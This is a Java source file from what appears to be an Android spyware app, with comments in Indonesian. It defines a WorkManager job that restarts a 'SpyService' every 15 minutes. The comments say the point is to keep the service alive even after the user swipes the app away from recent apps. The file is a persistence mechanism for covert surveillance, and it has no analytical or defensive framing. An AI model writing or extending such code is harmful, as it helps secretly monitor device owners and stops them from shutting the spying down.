package com.nullx.pp;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.ExistingPeriodicWorkPolicy;
import java.util.concurrent.TimeUnit;

/**
 * WorkManager job — jalan setiap 15 menit walaupun APK "dihapus" dari recent apps.
 * Memastikan SpyService selalu hidup.
 */
public class PersistentWorker extends Worker {

    public static final String WORK_TAG = "crpt_persistent_spy";

    public PersistentWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        Context ctx = getApplicationContext();
        // Restart SpyService kalau belum jalan
        Intent intent = new Intent(ctx, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(intent);
        } else {
            ctx.startService(intent);
        }
        return Result.success();
    }

    /** Daftarkan periodic work — dipanggil dari MainActivity dan RestarterReceiver */
    public static void schedule(Context ctx) {
        PeriodicWorkRequest req = new PeriodicWorkRequest.Builder(
                PersistentWorker.class, 15, TimeUnit.MINUTES)
                .build();
        WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(
                WORK_TAG,
                ExistingPeriodicWorkPolicy.KEEP,
                req);
    }
}
